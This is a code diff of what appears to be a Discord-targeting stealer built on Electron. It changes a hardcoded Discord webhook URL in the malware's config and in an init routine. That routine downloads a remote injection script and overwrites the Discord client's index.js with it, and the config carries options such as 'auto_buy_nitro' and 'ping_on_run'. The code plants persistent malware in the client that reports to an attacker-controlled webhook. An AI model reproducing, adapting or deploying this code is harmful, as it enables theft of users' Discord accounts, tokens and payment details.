@@ -6,7 +6,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: 'https://discord.com/api/webhooks/1208577809602187324/vrCrF-xekJ1NX7DKeV-Wq2wr6GTUKTDa9XmuwRypMRv9jxNfOZm67wZZ-Xb13RkQoQJ0', 
+  webhook: 'https://discord.com/api/webhooks/1209211221052493895/tCoEkfymMSF73uq7jGJdM6BRFjqPuqE9OmQeOGEV2LX9MYSIiDrzYJmNlYYBoJbdrG25', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
@@ -444,7 +444,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('https://discord.com/api/webhooks/1208577809602187324/vrCrF-xekJ1NX7DKeV-Wq2wr6GTUKTDa9XmuwRypMRv9jxNfOZm67wZZ-Xb13RkQoQJ0', '${config.webhook}')
+        res.replace('https://discord.com/api/webhooks/1209211221052493895/tCoEkfymMSF73uq7jGJdM6BRFjqPuqE9OmQeOGEV2LX9MYSIiDrzYJmNlYYBoJbdrG25', '${config.webhook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
